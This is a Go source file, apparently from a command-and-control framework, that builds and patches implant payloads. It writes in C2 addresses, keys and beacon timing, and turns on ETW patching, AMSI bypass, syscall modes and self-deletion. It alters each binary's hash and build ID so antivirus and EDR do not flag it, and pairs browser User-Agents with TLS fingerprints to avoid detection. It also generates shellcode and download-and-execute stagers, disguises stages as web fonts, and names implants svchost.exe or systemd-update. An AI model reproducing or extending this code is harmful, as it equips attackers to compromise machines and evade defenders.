package delivery

import (
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/godonut"
	"BackendTemplate/pkg/signing"
	"BackendTemplate/pkg/stager"
	"BackendTemplate/pkg/utils/logx"
	"bytes"
	"crypto/rand"
	"debug/elf"
	"encoding/binary"
	"fmt"
	"io/fs"
	"strconv"
	"strings"
	"time"
)

// BinaryFinder abstracts embedded client lookup (implemented by api package)
type BinaryFinder func(listenerType, osType, archType string) (fileName string, data []byte, err error)

// PatchOptions for client binary placeholder replacement
// MultiEndpointsPlaceholder 多传输端点列表占位符（512 字节，与客户端
// core/config/multi.go 的 MultiEndpoints 必须逐字节一致）。
// 用计算而不是手写字面量：手写 486 个 0 数错一个，替换就会"未命中模板"。
var MultiEndpointsPlaceholder = "MULTI_ENDPOINTS_PLACEHOLDER_" +
	strings.Repeat("0", 512-len("MULTI_ENDPOINTS_PLACEHOLDER_"))

type PatchOptions struct {
	ListenerConfig string // protocol://connectAddress
	OS             string
	Arch           string
	Pass           string
	VKey           string
	EncryptSalt    string
	FrontHost      string // B8: 域前置/CDN 回源 Host（可选；空则不覆盖客户端 Host 头）
	// Endpoints 多传输端点列表（"scheme://addr,scheme://addr"，可选）。
	// 非空时要求模板是多传输构建（含 512 字节定长占位符），等长替换写入。
	Endpoints     string
	JitterPercent string // client.jitter（0-50），可选；空则保持占位符原样
	// 主机层对抗（Windows）：ETW Patch / AMSI Bypass / syscall 模式
	ETWPatch    string // "1"=启用（默认）
	AmsiBypass  string // "1"=启用（默认）
	SyscallMode string // none/direct/indirect（默认 none）
	AutoDelete  string // "1"=上线后自动删除自身文件（默认 0）
	// 流量层 OPSEC：metadata 通道 + 流量填充
	MetadataChannel string // cookie/header/url/auto（默认 auto=每请求随机）
	Padding         string // "1"=请求/响应随机填充（默认开）
	Daemonize       string // "1"=Linux TTY 前台运行自动守护化释放终端（默认开）
	// 二进制 Hash 轮换：追加随机填充（改变每份载荷 hash，规避静态标记）
	HashPad bool
	// Sign 生成后做 Authenticode 签名（仅 Windows PE；由 config.signing 决定是否真的签）
	Sign bool
	// Format 载荷格式(exe/raw/dll/bin/hex/c)；shellcode 格式长度敏感不追加 pad
	Format string
	// OPSEC 编译期配置（可选，空值用客户端默认）
	ReconnectBaseDelay  string // 重连基础延迟（秒，1-60，仅允许降频钳制）
	ReconnectMaxRetries string // 重连最大重试（5-200，上限钳制）
	InjectTechDefault   string // 注入默认技术 auto/ntc/apc/crt
	MasqueradeName      string // 伪装修饰前缀（品牌字符串；空则随机生成）
	QuietMode           string // 静默模式 "1"=静默
	UserAgent           string // 网络请求 User-Agent（空值用客户端默认浏览器 UA）
	// Profile 驱动（C2 Profile YAML，空值保持客户端默认）
	HTTPGetURI     string // http-get 请求路径
	HTTPPostURI    string // http-post 请求路径
	WSPath         string // WebSocket 握手路径
	HeartbeatMs    string // 心跳基准（毫秒，兼容旧；统一后见 SleepSeconds）
	SleepSeconds   string // beacon sleep 秒数（统一心跳；优先于 listener 配置）
	TLSJA3         string // TLS 指纹名（chrome_120/firefox_121/edge_120/safari_17）
	DNSLabelPrefix string // DNS 内部标签前缀（与 DNS 监听器同步）
	SessionKeyInfo string // 会话密钥派生盐上下文（配置 security.session_key_info）
}

// PatchClientBinary replaces HOST/PASS/KEY/SALT/heartbeat placeholders in a prebuilt client.
func PatchClientBinary(binaryData []byte, opt PatchOptions) ([]byte, error) {
	if len(binaryData) == 0 {
		return nil, fmt.Errorf("empty binary")
	}
	if opt.ListenerConfig == "" || !strings.Contains(opt.ListenerConfig, "://") {
		return nil, fmt.Errorf("invalid listener config")
	}
	parts := strings.SplitN(opt.ListenerConfig, "://", 2)
	listenerType := strings.ToLower(parts[0])
	connectAddress := parts[1]

	data := append([]byte{}, binaryData...)

	// 占位符替换校验辅助：替换后必须命中，否则模板与二进制不匹配（如旧模板），
	// 载荷会携带公开默认密钥上线 —— 这是严重安全/功能问题，直接拒绝生成
	replaceOrErr := func(placeholder string, replacement []byte) error {
		// 【修复 OOM】必须等长替换：超长替换会使 bytes.ReplaceAll 撑大文件，
		// PE 各节的文件偏移整体错位 -> .reloc 读到全零 -> SizeOfBlock 下溢 ->
		// Binject/debug/pe 分配 8GB+ 内存导致服务端被 OOM kill（且载荷本身损坏）
		if len(replacement) != len(placeholder) {
			return fmt.Errorf("替换值长度(%d)与占位符(%d)不一致，拒绝 patch 以防载荷损坏: %s",
				len(replacement), len(placeholder), placeholder[:min(24, len(placeholder))])
		}
		if !bytes.Contains(data, []byte(placeholder)) {
			return fmt.Errorf("占位符 %s 未命中模板（模板与当前代码不匹配，请重建模板）", placeholder[:min(24, len(placeholder))])
		}
		data = bytes.ReplaceAll(data, []byte(placeholder), replacement)
		return nil
	}

	// password（【修复】空密码也必须替换占位符：不替换时客户端 ExecuteKey 为无效
	// 占位符串，参数校验必失败 → 未配置口令的载荷无法上线。空口令 = 无口令模式，
	// 占位符清空后客户端跳过参数校验直接上线）
	passPh := "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	newPass := padRight(strings.ReplaceAll(opt.Pass, " ", ""), len(passPh))
	if err := replaceOrErr(passPh, []byte(newPass)); err != nil {
		return nil, err
	}

	// keys
	masterKey, salt := resolveKeys(opt, connectAddress, listenerType)
	// J4: 默认/空密钥一律拒绝生成。本函数是 WebDelivery / 内存注入 / 会话迁移三条路径的
	// 共同出口，而这三条原先都没有闸门（只有 /server/gen 自带）：密钥解析落到公开默认值时
	// 照样出载荷，客户端自身的 fail-closed 只认"占位符未被替换"，认不出"被替换成了默认值"，
	// 于是载荷带着公开密钥上线——流量可解密、会话可伪造。判定与 server.go 的 J4 同源。
	if err := encrypt.ValidateListenerKeyConfigForStart(string(masterKey), string(salt)); err != nil {
		return nil, fmt.Errorf("拒绝生成客户端：%v", err)
	}
	masterPh := "LISTENER_MASTER_KEY_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	saltPh := "LISTENER_SALT_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	if len(masterKey) > 0 {
		mk := padRight(string(padKey(masterKey, 32)), len(masterPh))
		if err := replaceOrErr(masterPh, []byte(mk)); err != nil {
			return nil, err
		}
	}
	if len(salt) > 0 {
		s := padRight(string(padKey(salt, 16)), len(saltPh))
		if err := replaceOrErr(saltPh, []byte(s)); err != nil {
			return nil, err
		}
	}

	// heartbeat = beacon sleep 秒数（统一心跳，CS 单一事实来源）
	// 默认链：opt.SleepSeconds(显式) > opt.HeartbeatMs 换算(profile 毫秒) > 监听器配置 > 默认 5
	hbInterval := "10"
	if database.DB() != nil {
		_, hbInterval = database.GetListenerHeartbeatConfigByAddr(connectAddress, listenerType)
	}
	sleepSeconds := hbInterval
	if opt.SleepSeconds != "" && opt.SleepSeconds != "0" {
		if v, err := strconv.Atoi(opt.SleepSeconds); err == nil && v > 0 {
			sleepSeconds = strconv.Itoa(v)
		}
	} else if opt.HeartbeatMs != "" && opt.HeartbeatMs != "0" {
		if v, err := strconv.Atoi(opt.HeartbeatMs); err == nil && v > 0 {
			// profile sleeptime_ms(毫秒) -> 秒，向下取整且至少 1
			sec := v / 1000
			if sec < 1 {
				sec = 1
			}
			sleepSeconds = strconv.Itoa(sec)
		}
	}
	hbIntervalPh := "HEARTBEAT_INTERVAL_PLACEHOLDER_12345"
	hbTimeoutPh := "HEARTBEAT_TIMEOUT_PLACEHOLDER_12345"
	if err := replaceOrErr(hbIntervalPh, []byte(padRight(sleepSeconds, len(hbIntervalPh)))); err != nil {
		return nil, err
	}
	// 心跳超时占位符为可选且已废弃（客户端 RecvDeadline 按 sleep+jitter 自算）：
	// 统一以空格替换并保留原长度（防止旧模板残留占位符触发 fail-closed），
	// 旧模板无此占位符时忽略
	// 忽略错误：模板可能不含该占位符
	_ = replaceOrErr(hbTimeoutPh, []byte(strings.Repeat(" ", len(hbTimeoutPh))))

	// 抖动百分比：配置文件 client.jitter，best-effort（模板缺失时忽略，与 GenServer 行为一致）
	if opt.JitterPercent != "" {
		jitterPh := "JITTER_PERCENT_PLACEHOLDER_12345"
		// 忽略错误：模板可能不含该占位符
		_ = replaceOrErr(jitterPh, []byte(padRight(opt.JitterPercent, len(jitterPh))))
	}

	// B8: 域前置/CDN 回源 Host（http/https 客户端专用占位符，未配置时保持占位符以禁用）
	if opt.FrontHost != "" {
		frontPh := "HOST_FRONT_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		if err := replaceOrErr(frontPh, []byte(padRight(opt.FrontHost, len(frontPh)))); err == nil {
			// 替换成功
		} else {
			// http/https 之外的类型无该占位符，忽略
			_ = err
		}
	}

	// ===== OPSEC 编译期配置 =====
	// 【重要】全部无条件替换（空值用客户端默认），否则占位符残留会触发客户端
	// VerifyNoPlaceholderResidue 的 fail-closed 拒绝启动。占位符缺失的旧模板忽略。
	opsecDefaults := []struct {
		ph  string
		val string
	}{
		{"RECONNECT_BASE_DELAY_PLACEHOLDER_12345", opt.ReconnectBaseDelay},
		{"RECONNECT_MAX_RETRIES_PLACEHOLDER_12345", opt.ReconnectMaxRetries},
		{"INJECT_TECH_DEFAULT_PLACEHOLDER_12345", opt.InjectTechDefault},
		{"MASQUERADE_NAME_PLACEHOLDER_12345", opt.MasqueradeName},
		{"QUIET_MODE_PLACEHOLDER_12345", opt.QuietMode},
		{"ETW_PATCH_PLACEHOLDER_12345", opt.ETWPatch},
		{"AMSI_BYPASS_PLACEHOLDER_12345", opt.AmsiBypass},
		{"SYSCALL_MODE_PLACEHOLDER_12345", opt.SyscallMode},
		{"AUTO_DELETE_PLACEHOLDER_12345", opt.AutoDelete},
	}
	defs := map[string]string{
		"RECONNECT_BASE_DELAY_PLACEHOLDER_12345":  "1",
		"RECONNECT_MAX_RETRIES_PLACEHOLDER_12345": "50",
		"INJECT_TECH_DEFAULT_PLACEHOLDER_12345":   "auto",
		"QUIET_MODE_PLACEHOLDER_12345":            "1",
		"ETW_PATCH_PLACEHOLDER_12345":             "0",
		"AMSI_BYPASS_PLACEHOLDER_12345":           "0",
		"SYSCALL_MODE_PLACEHOLDER_12345":          "none",
		"AUTO_DELETE_PLACEHOLDER_12345":           "1",
	}
	for _, o := range opsecDefaults {
		v := o.val
		if v == "" {
			if d, ok := defs[o.ph]; ok {
				v = d
			}
		}
		if len(v) > len(o.ph) {
			return nil, fmt.Errorf("OPSEC 配置值超长（占位符 %s 最长 %d 字符）: %q", o.ph, len(o.ph), v)
		}
		if err := replaceOrErr(o.ph, []byte(padRight(v, len(o.ph)))); err != nil {
			_ = err // 旧模板无此占位符
		}
	}

	// User-Agent（OPSEC：消除 Go-http-client/1.1 特征；空值用客户端默认浏览器 UA）
	// 【重要】占位符为 120 字符长填充（UA 可达 110+ 字符，短占位符会被 padRight 截断）
	uaPh := "HTTP_UA_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 必须与客户端 config.UserAgentPlaceholder 完全一致（单一字面量）
	ua := opt.UserAgent
	if ua == "" {
		// UA↔JA3 联动：未显式配置 UA 时，按 TLS 指纹选择配套浏览器 UA（避免"Chrome 指纹+Firefox UA"被联动检出）
		ua = uaForJA3(opt.TLSJA3)
	}
	if len(ua) > len(uaPh) {
		return nil, fmt.Errorf("User-Agent 超长（最长 %d 字符）: %q", len(uaPh), ua)
	}
	if err := replaceOrErr(uaPh, []byte(padRight(ua, len(uaPh)))); err != nil {
		_ = err // 旧模板无此占位符
	}

	// Profile 驱动占位符（URI/WS 路径/心跳基准；空值用客户端默认，无条件替换防残留）
	// 【URI 占位符升级】GET/POST 占位符已加长到 128 字符（客户端 config.go 同步），
	// phs 按优先级列出新旧占位符：新模板命中新占位符（支持长 URI），旧模板
	// 回退旧占位符（长度上限仍为旧占位符长度）
	profileDefaults := []struct {
		phs []string
		val string
		def string
	}{
		{[]string{
			"HTTP_GET_URI_PLACEHOLDER_1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123",
			"HTTP_GET_URI_PLACEHOLDER_12345",
		}, opt.HTTPGetURI, "/tencent/mcp/pc/pcsearch"},
		{[]string{
			"HTTP_POST_URI_PLACEHOLDER_123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012",
			"HTTP_POST_URI_PLACEHOLDER_12345",
		}, opt.HTTPPostURI, "/tencent/sensearch/collection/item/check"},
		{[]string{"WS_PATH_PLACEHOLDER_12345"}, opt.WSPath, "/ws"},
		{[]string{"HEARTBEAT_BASE_PLACEHOLDER_12345"}, opt.HeartbeatMs, "1000"},
		{[]string{"TLS_JA3_PLACEHOLDER_12345"}, opt.TLSJA3, "chrome_120"},
		{[]string{"DNS_LABEL_PREFIX_PLACEHOLDER_12345"}, opt.DNSLabelPrefix, ""},
		{[]string{"SESSION_KEY_INFO_PLACEHOLDER_12345"}, opt.SessionKeyInfo, "8d2c91f4a6"},
		{[]string{"METADATA_CHANNEL_PLACEHOLDER_12345"}, opt.MetadataChannel, "auto"},
		{[]string{"PADDING_PLACEHOLDER_12345"}, opt.Padding, "1"},
		{[]string{"DAEMONIZE_PLACEHOLDER_12345"}, opt.Daemonize, "1"},
	}
	for _, o := range profileDefaults {
		// 选模板中实际存在的占位符（新优先）；都没有则该模板不含此占位符，跳过
		ph := ""
		for _, cand := range o.phs {
			if bytes.Contains(data, []byte(cand)) {
				ph = cand
				break
			}
		}
		if ph == "" {
			continue
		}
		v := o.val
		fromDefault := false
		if v == "" {
			v = o.def
			fromDefault = true
		}
		// 【修复 OOM】超长值禁止等长替换之外的原样写入：
		// - 值与标准默认一致（含 GenServer 从 profile 显式传入的默认 URI）：
		//   置空替换，客户端 TrimSpace 后回退到完全相同的内置默认值，行为不变
		// - 用户自定义超长值：直接报错（无法安全注入，也不应静默回退）
		if len(v) > len(ph) {
			if fromDefault || v == o.def {
				v = ""
			} else {
				return nil, fmt.Errorf("profile 配置值超长（占位符 %s… 最长 %d 字符）: %q", ph[:min(28, len(ph))], len(ph), v)
			}
		}
		if err := replaceOrErr(ph, []byte(padRight(v, len(ph)))); err != nil {
			_ = err // 理论不会发生（已确认存在）；防御性忽略
		}
	}

	// host / connect address
	if listenerType == "oss" {
		oldStr := strings.Repeat("HOST", 1) + strings.Repeat("A", 1196) // fallback long placeholder
		// use the same long placeholder as server GenServer if present in binary
		longPh := findOSSHostPlaceholder(data)
		if longPh != "" {
			oldStr = longPh
		}
		// 【修复】host 明文 patch：客户端直接读取 config.Host（不解密），
		// 原实现加密后 patch 导致正向连接地址解析错误
		newStr := padRight(strings.ReplaceAll(connectAddress, " ", ""), len(oldStr))
		if err := replaceOrErr(oldStr, []byte(newStr)); err != nil {
			return nil, err
		}
	} else if listenerType == "tcp_forward" || listenerType == "kcp_forward" || listenerType == "ws_forward" || listenerType == "http_forward" || listenerType == "https_forward" {
		// 正向客户端：目标机监听 hostPh 占位符 = connectAddress（"0.0.0.0:PORT" 完整 spec）。
		// 客户端 transport 直接 net.Listen(spec)/http.ListenAndServe(spec) —— 单一占位符承载完整监听地址。
		hostPh := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		if err := replaceOrErr(hostPh, []byte(padRight(strings.ReplaceAll(connectAddress, " ", ""), len(hostPh)))); err != nil {
			return nil, err
		}
	} else {
		hostPh := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		newStr := padRight(strings.ReplaceAll(connectAddress, " ", ""), len(hostPh))
		if err := replaceOrErr(hostPh, []byte(newStr)); err != nil {
			return nil, err
		}
	}

	// 多传输端点列表（仅多传输模板含该占位符；未提供则不动）
	if opt.Endpoints != "" {
		patched, perr := patchMultiEndpoints(data, opt.Endpoints)
		if perr != nil {
			return nil, perr
		}
		data = patched
	}

	// OPSEC: 二进制 Hash 轮换——每份载荷追加随机长度填充字节，hash 唯一化，
	// 规避"同一模板二进制 hash 固定被 AV/EDR 静态标记"问题。
	// 仅对可执行文件（exe/raw/dll）追加；shellcode(bin/hex/c) 长度敏感不追加。
	shellcodeFmt := opt.Format == "bin" || opt.Format == "hex" || opt.Format == "c"
	if opt.HashPad && !shellcodeFmt {
		data = randomizeGoBuildID(data)
		data = appendHashPadding(data)
	}

	// 代码签名必须在所有 patch/pad 之后 —— 签名覆盖最终字节，签完再改就失效。
	// 未启用时 signing.Sign 原样返回；启用但失败则让载荷生成失败（不静默发未签名文件）。
	if opt.Sign && strings.EqualFold(opt.OS, "windows") && !shellcodeFmt {
		signed, serr := signing.Sign(data)
		if serr != nil {
			return nil, fmt.Errorf("代码签名失败: %w", serr)
		}
		data = signed
	}

	return data, nil
}

// randomizeGoBuildID 将 Go build id 替换为等长随机串。
// 同一模板的所有载荷 build id 相同（携带工具链/构建信息，是样本关联的稳定特征）。
// 精确定位 ELF .note.go.buildid 节的 note desc（80 字符可打印 build id）等长替换；
// 非 ELF 格式（PE 等）跳过（hash pad 已保证每份载荷 hash 唯一）。
func randomizeGoBuildID(data []byte) []byte {
	f, err := elf.NewFile(bytes.NewReader(data))
	if err != nil {
		return data // 非 ELF（PE/未知）跳过
	}
	sec := f.Section(".note.go.buildid")
	if sec == nil || sec.Offset == 0 {
		return data
	}
	noteData, err := sec.Data()
	if err != nil || len(noteData) < 16 {
		return data
	}
	namesz := binary.LittleEndian.Uint32(noteData[0:4])
	descsz := binary.LittleEndian.Uint32(noteData[4:8])
	if namesz != 4 || descsz == 0 || descsz > 512 {
		return data
	}
	namePadded := (namesz + 3) &^ 3
	descStart := 12 + int(namePadded)
	if descStart+int(descsz) > len(noteData) {
		return data
	}
	// 校验 desc 为可打印字符（防误伤）
	desc := noteData[descStart : descStart+int(descsz)]
	for _, b := range desc {
		if (b < '0' || b > '9') && (b < 'a' || b > 'z') && (b < 'A' || b > 'Z') && b != '+' && b != '/' && b != '-' && b != '_' {
			return data
		}
	}
	// 文件内全局偏移 → 等长随机替换
	off := sec.Offset + uint64(descStart)
	if off+uint64(len(desc)) > uint64(len(data)) {
		return data
	}
	randBytes := make([]byte, len(desc))
	if _, err := rand.Read(randBytes); err != nil {
		return data
	}
	const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/-_"
	for i, b := range randBytes {
		randBytes[i] = alphabet[int(b)%len(alphabet)]
	}
	out := make([]byte, 0, len(data))
	out = append(out, data[:off]...)
	out = append(out, randBytes...)
	out = append(out, data[off+uint64(len(desc)):]...)
	return out
}

// uaForJA3 按 TLS 指纹返回配套 User-Agent（UA↔JA3 联动组合表）。
// 组合均为真实浏览器的 UA 与指纹一一对应，避免混合特征被 EDR/态势感知联动检出。
func uaForJA3(ja3 string) string {
	switch ja3 {
	case "firefox_121":
		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
	case "edge_120":
		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
	case "safari_17":
		return "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
	default: // chrome_120
		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	}
}

// appendHashPadding 在二进制尾部追加随机长度的加密随机字节。
// ELF/PE 对文件尾部追加数据安全（不改变节表偏移与入口点）；Go 二进制无自校验。
func appendHashPadding(data []byte) []byte {
	// pad 长度随机 32-512 字节（足够改变 hash，不过分增大体积）
	var lb [2]byte
	if _, err := rand.Read(lb[:]); err != nil {
		return data
	}
	padLen := 32 + int(binary.BigEndian.Uint16(lb[:])%481)
	pad := make([]byte, padLen)
	if _, err := rand.Read(pad); err != nil {
		return data // 随机源失败则不追加（保持可用）
	}
	return append(data, pad...)
}

func resolveKeys(opt PatchOptions, connectAddress, listenerType string) (masterKey, salt []byte) {
	if opt.VKey != "" {
		masterKey = padKey([]byte(opt.VKey), 32)
	}
	if opt.EncryptSalt != "" {
		salt = padKey([]byte(opt.EncryptSalt), 16)
	}
	if len(masterKey) > 0 && len(salt) > 0 {
		return masterKey, salt
	}
	// from DB by address
	if database.DB() != nil {
		mk, s := encrypt.GetListenerKeyConfigByAddress(connectAddress)
		if len(masterKey) == 0 && len(mk) > 0 {
			masterKey = mk
		}
		if len(salt) == 0 && len(s) > 0 {
			salt = s
		}
	}
	if len(masterKey) == 0 || len(salt) == 0 {
		if listenerType == "tcp_forward" || listenerType == "kcp_forward" || listenerType == "ws_forward" || listenerType == "http_forward" || listenerType == "https_forward" {
			mk, s := encrypt.GetListenerKeyConfigForForward(listenerType)
			if len(masterKey) == 0 {
				masterKey = mk
			}
			if len(salt) == 0 {
				salt = s
			}
		}
	}
	return masterKey, salt
}

func padKey(b []byte, n int) []byte {
	out := make([]byte, n)
	copy(out, b)
	return out
}

func padRight(str string, length int) string {
	if len(str) >= length {
		return str
	}
	return str + strings.Repeat(" ", length-len(str))
}

func findOSSHostPlaceholder(data []byte) string {
	// look for long HOSTAAAA... run
	idx := bytes.Index(data, []byte("HOSTAAA"))
	if idx < 0 {
		return ""
	}
	// extend while A or H O S T pattern — simplify: fixed known length from GenServer (~1200+ chars of HOST/A)
	// scan consecutive ASCII from idx
	end := idx
	for end < len(data) && end-idx < 2000 {
		c := data[end]
		if (c >= 'A' && c <= 'Z') || c == 'A' {
			end++
			continue
		}
		break
	}
	if end-idx > 50 {
		return string(data[idx:end])
	}
	return ""
}

// BuildPayload creates full (+ optional stager/shellcode) for a delivery profile.
// finder loads embedded protocol binaries; may be nil if fullData already provided.
func BuildPayload(meta database.WebDelivery, fullData []byte, buildStager bool) (Payload, error) {
	var p Payload
	p.FileName = meta.FileName
	if p.FileName == "" {
		if meta.OS == "windows" {
			p.FileName = "client.exe"
		} else {
			p.FileName = "client"
		}
	}
	p.Full = fullData
	if len(p.Full) == 0 {
		return p, fmt.Errorf("full payload empty")
	}

	// Windows shellcode via donut (best-effort)
	if strings.ToLower(meta.OS) == "windows" {
		sc, err := godonut.GenShellcode(p.Full, meta.Pass, meta.Arch)
		if err == nil && len(sc) > 0 {
			p.Shellcode = sc
		} else if err != nil {
			logx.Infof("[delivery] donut shellcode failed: %v\n", err)
		}
	}

	// Dynamic stager (needs go toolchain) — best-effort
	if buildStager {
		downloadURL := meta.ServerAddress
		if downloadURL == "" {
			// temporary; caller should rebuild URLs then optionally rebuild stager
			downloadURL = "http://127.0.0.1/placeholder"
		}
		// Windows stager typically pulls .woff shellcode URL in old design;
		// for hub we point stager at full URL (stager template downloads and execs with password).
		cfg := &stager.StagerConfig{
			DownloadURL: downloadURL,
			UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			Timeout:     30,
			Arch:        meta.Arch,
			OS:          meta.OS,
			AntiDebug:   false,
			Obfuscation: false,
			SleepTime:   3,
			MaxRetries:  3,
			Lightweight: true,
			Password:    meta.Pass,
			XorKey:      meta.XorKey, // Stage XOR 混淆密钥
		}
		builder := stager.NewStagerBuilder(cfg)
		bin, err := builder.Build()
		if err != nil {
			logx.Infof("[delivery] dynamic stager build skipped: %v\n", err)
		} else {
			p.Stager = bin
			// if no donut sc yet, try donut on stager for windows
			if len(p.Shellcode) == 0 && strings.ToLower(meta.OS) == "windows" {
				if sc, err2 := godonut.GenShellcode(bin, "", meta.Arch); err2 == nil {
					p.Shellcode = sc
				}
			}
		}
	}

	return p, nil
}

// RebuildStagerForURL rebuilds stager pointing at a concrete download URL
func RebuildStagerForURL(meta database.WebDelivery, downloadURL string) ([]byte, error) {
	if downloadURL == "" {
		return nil, fmt.Errorf("empty download url")
	}
	// Prefer woff/sc URL for windows staged pull if available
	cfg := &stager.StagerConfig{
		DownloadURL: downloadURL,
		UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		Timeout:     30,
		Arch:        meta.Arch,
		OS:          meta.OS,
		SleepTime:   3,
		MaxRetries:  5,
		Lightweight: true,
		Password:    meta.Pass,
		XorKey:      meta.XorKey, // Stage XOR 混淆密钥
	}
	return stager.NewStagerBuilder(cfg).Build()
}

// DefaultContentType returns camouflage CT by resource hint
func DefaultContentType(osType, kind string) string {
	switch kind {
	case "stage", "woff", "sc":
		if osType == "windows" {
			return "font/woff"
		}
		return "application/octet-stream"
	default:
		return "application/octet-stream"
	}
}

// EnsureMetaDefaults fills hub fields on create
func EnsureMetaDefaults(meta *database.WebDelivery) {
	if meta.BindMode == "" {
		meta.BindMode = "shared"
	}
	if meta.PublicKey == "" {
		meta.PublicKey = ShortKey()
	}
	if meta.ContentType == "" {
		meta.ContentType = "application/octet-stream"
	}
	if meta.StageContentType == "" {
		meta.StageContentType = DefaultContentType(meta.OS, "woff")
	}
	if meta.FileName == "" {
		if meta.OS == "windows" {
			meta.FileName = "svchost.exe"
		} else {
			meta.FileName = "systemd-update"
		}
	}
	if meta.SaveFilename == "" {
		meta.SaveFilename = meta.FileName
	}
	if meta.DownloadPath == "" {
		if meta.OS == "windows" {
			meta.DownloadPath = `C:\Windows\Temp`
		} else {
			meta.DownloadPath = "/tmp"
		}
	}
	if meta.Status == 0 {
		meta.Status = 1
	}
	// shared mode: ListeningPort marker
	if meta.BindMode == "shared" && (meta.ListeningPort == "" || meta.ListeningPort == "0") {
		meta.ListeningPort = "shared-" + meta.PublicKey
	}
}

// ReadEmbedded is a helper signature docs — actual read done in api via embed.FS
var _ fs.FS

// Now helper
func NowString() string {
	return time.Now().Format("2006-01-02 15:04:05")
}

// patchMultiEndpoints 把端点列表写入多传输模板的定长占位符（等长替换）。
// 单传输模板不含该占位符，调用方只应在生成多传输载荷时调用。
func patchMultiEndpoints(data []byte, endpoints string) ([]byte, error) {
	normalized := strings.ReplaceAll(strings.TrimSpace(endpoints), " ", "")
	if normalized == "" {
		return data, nil
	}
	if len(normalized) > len(MultiEndpointsPlaceholder) {
		return nil, fmt.Errorf("端点列表过长（%d 字节，上限 %d）", len(normalized), len(MultiEndpointsPlaceholder))
	}
	if !bytes.Contains(data, []byte(MultiEndpointsPlaceholder)) {
		return nil, fmt.Errorf("模板不含多传输端点占位符（请用 multi 模板生成）")
	}
	return bytes.ReplaceAll(data, []byte(MultiEndpointsPlaceholder),
		[]byte(padRight(normalized, len(MultiEndpointsPlaceholder)))), nil
}
